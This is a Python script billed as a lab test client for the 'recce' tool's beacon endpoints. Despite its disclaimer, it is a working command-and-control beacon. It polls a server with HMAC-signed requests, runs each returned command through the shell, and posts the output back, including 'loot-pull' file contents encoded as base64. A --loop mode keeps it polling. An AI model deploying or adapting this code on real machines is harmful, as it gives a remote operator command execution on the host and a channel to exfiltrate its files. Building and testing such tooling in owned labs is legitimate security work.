#!/usr/bin/env python3
"""Development test harness for recce's beacon endpoints.

This is a **lab test client** — it exercises `POST /beacon/checkin` and
`POST /beacon/result` against your own recce server so you can verify the
beacon subsystem end-to-end (task queue → deliver → run → result → save)
without hand-crafting HTTP + HMAC calls in a REPL.

It is intentionally minimal and transparent: single file, stdlib only, prints
every request and response, one-shot by default. It is **not** a stager,
implant, or C2 client — it runs commands returned by a recce server you own,
against the machine you run this script on. Use it against your own recce
instance in a lab / dev network only.

Usage:
    # Register a beacon in recce, note the id + PSK from the "shown once" modal:
    #   recce webui → Sessions → Beacons → + Register
    # Then run this against it:
    python3 tools/beacon-test-client.py \\
        --url http://127.0.0.1:8011 \\
        --id  <beacon-id-hex> \\
        --psk <psk-from-register>

    # By default: one check-in, run any queued tasks, post results, exit.
    # --loop keeps polling with sleep_s from the server's response.
    # --dry-run prints tasks but doesn't execute anything.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import subprocess
import sys
import time
import urllib.request


def sign(psk: str, bid: str, ts: str, body: bytes) -> str:
    """Recce's beacon HMAC: SHA-256 over `f'{bid}:{ts}:'.encode() + body`."""
    msg = f"{bid}:{ts}:".encode("ascii") + body
    return hmac.new(psk.encode("utf-8"), msg, hashlib.sha256).hexdigest()


def post(url: str, path: str, bid: str, psk: str, body: bytes) -> dict:
    """One signed POST to a beacon endpoint. Returns the parsed JSON."""
    ts = str(int(time.time()))
    mac = sign(psk, bid, ts, body)
    req = urllib.request.Request(url.rstrip("/") + path, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("X-Beacon-Id", bid)
    req.add_header("X-Beacon-Ts", ts)
    req.add_header("X-Beacon-Mac", mac)
    with urllib.request.urlopen(req, timeout=30) as r:
        raw = r.read()
    try:
        return json.loads(raw or b"{}")
    except json.JSONDecodeError:
        return {"raw": raw.decode("utf-8", "replace")}


def run_task(command: str, dry_run: bool, timeout: int) -> tuple[bytes, str]:
    """Run one command through /bin/sh and capture stdout+stderr. Returns
    (output_bytes, status). status is 'done' on exit=0, 'error' otherwise."""
    if dry_run:
        print(f"    [dry-run] would exec: {command!r}")
        return b"", "done"
    try:
        p = subprocess.run(command, shell=True, capture_output=True, timeout=timeout)
        out = p.stdout + p.stderr
        status = "done" if p.returncode == 0 else "error"
        return out, status
    except subprocess.TimeoutExpired as e:
        return f"(timeout after {timeout}s)".encode(), "error"
    except Exception as e:  # noqa: BLE001
        return f"(exec error: {e})".encode(), "error"


def cycle_once(args) -> tuple[int, float]:
    """One check-in + drain + result cycle. Returns (tasks_delivered, next_sleep_s)."""
    print(f"[checkin] POST {args.url}/beacon/checkin  id={args.id[:8]}")
    resp = post(args.url, "/beacon/checkin", args.id, args.psk, b"{}")
    tasks = resp.get("tasks") or []
    next_sleep = float(resp.get("sleep", args.default_sleep))
    print(f"[checkin] -> {len(tasks)} task(s), next sleep={next_sleep}s")
    for i, t in enumerate(tasks, 1):
        tid = t.get("task_id", "")
        cmd = t.get("command", "")
        kind = t.get("kind", "task")
        print(f"  [{i}/{len(tasks)}] task_id={tid[:8]}  kind={kind}  cmd={cmd!r}")
        out, status = run_task(cmd, args.dry_run, args.exec_timeout)
        # /beacon/result wants the command's stdout base64-encoded in output_b64
        # for binary-safe JSON transit. For loot-pull tasks the command is
        # already `base64 <path>` so its stdout is itself base64 text — the
        # server double-decodes on the other side to get the raw file bytes.
        body = json.dumps({
            "task_id": tid, "status": status,
            "output_b64": base64.b64encode(out).decode("ascii"),
        }).encode("utf-8")
        r = post(args.url, "/beacon/result", args.id, args.psk, body)
        art = r.get("artifact_id")
        note = f"  <- {status}, {len(out)}B"
        if art:
            note += f", artifact={art[:8]} (saved to session-loot)"
        print(note)
    return len(tasks), next_sleep


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--url", required=True, help="recce base URL, e.g. http://127.0.0.1:8011")
    ap.add_argument("--id", required=True, help="beacon id (from register response)")
    ap.add_argument("--psk", required=True, help="pre-shared key (shown once at register)")
    ap.add_argument("--loop", action="store_true",
                    help="keep polling with the sleep interval the server returns "
                         "(otherwise: one cycle then exit)")
    ap.add_argument("--dry-run", action="store_true",
                    help="print every task the server hands out but don't execute — "
                         "echoes empty output back so the queue drains cleanly")
    ap.add_argument("--exec-timeout", type=int, default=30,
                    help="per-task command timeout in seconds (default: 30)")
    ap.add_argument("--default-sleep", type=float, default=5.0,
                    help="fallback sleep between cycles when the server omits it (default: 5)")
    args = ap.parse_args()

    print(f"[start] test client polling {args.url} as beacon {args.id[:8]}"
          f"{' (dry-run)' if args.dry_run else ''}")
    try:
        while True:
            n, sleep_s = cycle_once(args)
            if not args.loop:
                print(f"[done] one-shot mode — {n} task(s) processed")
                return 0
            time.sleep(max(1.0, sleep_s))
    except KeyboardInterrupt:
        print("\n[stop] interrupted")
        return 0
    except urllib.error.HTTPError as e:
        print(f"[error] HTTP {e.code}: {e.read()[:200].decode('utf-8', 'replace')}", file=sys.stderr)
        return 1
    except Exception as e:  # noqa: BLE001
        print(f"[error] {type(e).__name__}: {e}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
